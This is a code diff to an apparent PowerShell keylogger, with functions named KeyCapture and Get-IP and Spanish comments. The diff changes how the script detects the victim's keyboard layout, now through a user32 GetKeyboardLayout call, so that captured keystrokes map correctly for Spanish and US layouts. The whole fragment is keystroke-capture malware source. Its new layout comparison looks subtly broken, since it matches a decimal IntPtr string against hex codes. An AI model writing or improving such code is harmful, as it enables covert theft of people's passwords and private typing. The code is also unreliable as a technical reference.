@@ -21,8 +21,17 @@ Function Get-IP {
 }
 
 Function Get-KeyboardLayout {
-    $langID = [System.Windows.Forms.InputLanguage]::CurrentInputLanguage.Culture.Name
-    return $langID
+    # Usamos la API de Windows para obtener el layout del teclado activo.
+    Add-Type @"
+    using System;
+    using System.Runtime.InteropServices;
+    public class KeyboardLayout {
+        [DllImport("user32.dll")]
+        public static extern IntPtr GetKeyboardLayout(int idThread);
+    }
+"@
+    $layout = [KeyboardLayout]::GetKeyboardLayout(0)
+    return $layout
 }
 
 Function KeyCapture {
@@ -37,7 +46,7 @@ Function KeyCapture {
     $KeypressThreshold = [TimeSpan]::FromSeconds(10)
     $capturedKeys = ""
 
-    # Detectar la distribución del teclado
+    # Detectar el layout del teclado
     $keyboardLayout = Get-KeyboardLayout
 
     While ($true) {
@@ -62,7 +71,7 @@ Function KeyCapture {
                             $LString = $logchar.ToString()
 
                             # Dependiendo del layout de teclado, ajustamos caracteres especiales
-                            if ($keyboardLayout -eq "es-ES") {  # Español
+                            if ($keyboardLayout.ToString().ToUpper() -eq '040A040A') {  # Español (España) - se usa un código específico
                                 if ($asc -eq 50) { $LString = "@" }
                                 elseif ($asc -eq 56) { $LString = "*" }
                                 elseif ($asc -eq 49) { $LString = "!" }
@@ -70,7 +79,7 @@ Function KeyCapture {
                                 elseif ($asc -eq 52) { $LString = "$" }
                                 # Aquí puedes agregar más caracteres si es necesario
                             }
-                            elseif ($keyboardLayout -eq "en-US") {  # Inglés
+                            elseif ($keyboardLayout.ToString().ToUpper() -eq '04090409') {  # Inglés (Estados Unidos) - otro código
                                 if ($asc -eq 50) { $LString = "@" }
                                 elseif ($asc -eq 51) { $LString = "#" }
                                 elseif ($asc -eq 52) { $LString = "$" }
